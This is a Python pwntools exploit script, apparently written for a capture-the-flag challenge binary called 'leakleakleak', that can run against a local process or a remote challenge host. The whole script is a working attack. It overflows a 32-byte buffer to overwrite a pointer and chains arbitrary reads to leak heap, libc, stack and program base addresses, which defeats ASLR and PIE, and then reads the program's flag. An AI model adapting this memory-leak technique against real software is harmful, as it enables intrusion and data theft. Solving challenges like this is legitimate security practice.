#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './leakleakleak'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '62880d0.678470.xyz', 31788

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *create_user+58
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    # =================================
    #             HEAP LEAK
    # =================================

    payload = cyclic(32 + 1)
    io.sendafter(b'?', payload)
    
    io.recvuntil(b'haaai')
    leak1 = u64(b'\x00' + io.recvline()[:-2].ljust(7, b'\x00'))
    heap = leak1 - 0x2600

    # =================================
    #             LIBC LEAK
    # =================================

    io.sendlineafter(b'?', b'Y')
    target = heap + 0x3720
    payload  = cyclic(32) + p64(target)
    io.sendafter(b'?', payload)

    io.recvuntil(b':3\n')
    leak2 = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak2 - 0x21ace0

    # =================================
    #            STACK LEAK
    # =================================

    io.sendlineafter(b'?', b'Y')
    payload = cyclic(32) + p64(libc.sym['__environ'])
    io.sendafter(b'?', payload)

    io.sendlineafter(b'?', b'Y')
    payload = cyclic(32) + p64(libc.sym['__environ'])
    io.sendafter(b'?', payload)

    io.recvuntil(b':3\n')
    io.recvuntil(b':3\n')

    stack = u64(io.recvline().strip().ljust(8, b'\x00'))

    # =================================
    #          ELF BASE LEAK
    # =================================

    io.sendlineafter(b'?', b'Y')
    target = stack - 0x30
    payload = cyclic(32) + p64(target)
    io.sendafter(b'?', payload)

    io.recvlines(6)
    leak3 = u64(io.recvline().strip().ljust(8, b'\x00'))
    elf.address = leak3 - 0x1115

    # =================================
    #             FLAG LEAK
    # =================================

    io.sendlineafter(b'?', b'Y')
    payload = cyclic(32) + p64(elf.sym['flag'])
    io.sendafter(b'?', payload)

    info('leak: %#x', leak3)
    info('heap base: %#x', heap)
    info('libc base: %#x', libc.address)    
    info('environ: %#x', libc.sym['__environ'])
    info('stack leak: %#x', stack)
    info('elf base: %#x', elf.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()